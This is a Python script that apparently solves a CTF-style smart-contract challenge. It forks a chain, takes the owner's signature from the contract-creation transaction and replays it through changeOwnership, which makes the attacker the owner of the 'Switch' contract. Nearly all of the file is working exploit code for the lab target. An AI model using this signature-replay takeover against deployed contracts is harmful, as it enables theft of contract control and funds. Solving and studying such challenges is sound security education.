from ape import accounts, chain, Contract
from .utils.helper import fork, get_block, get_code

BLOCK = 7399228
SWITCH_CONTRACT = "0xa5343165d51Ea577d63e1a550b1F3c872ADc58e4"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contract ---\n")
    switch = Contract(SWITCH_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # we just need to get a valid signature
    # I am getting the signature of the owner from the creation of
    # the challenge contract. I could have also just signed a message myself.
    for tx in chain.provider.get_transactions_by_block(BLOCK):
        if tx.receiver == None and get_code(SWITCH_CONTRACT)[2:] in tx.data.hex():
            signature = tx.signature
            break
    switch.changeOwnership(
        28,
        signature.r,
        signature.s,
        sender=attacker,
        # max_fee="100 gwei",
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are now the owner of the contract ---\n")

    assert switch.owner() == attacker.address

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
